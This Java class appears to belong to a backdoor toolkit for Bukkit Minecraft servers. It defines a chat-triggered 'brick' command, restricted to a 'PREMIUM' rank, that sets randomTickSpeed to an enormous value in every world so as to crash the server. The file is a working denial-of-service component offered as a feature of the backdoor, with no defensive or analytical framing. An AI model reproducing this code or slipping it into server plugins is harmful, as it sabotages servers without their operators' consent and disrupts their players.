package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "brick",
   description = "Crash the server",
   blatant = true,
   rank = Rank.PREMIUM
)
public class CrashCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      ChatUtil.sendChat(var1.getPlayer(), "Crashed the server.");
      Bukkit.getServer().getWorlds().forEach(w -> w.setGameRuleValue("randomTickSpeed", "299999999"));
   }
}
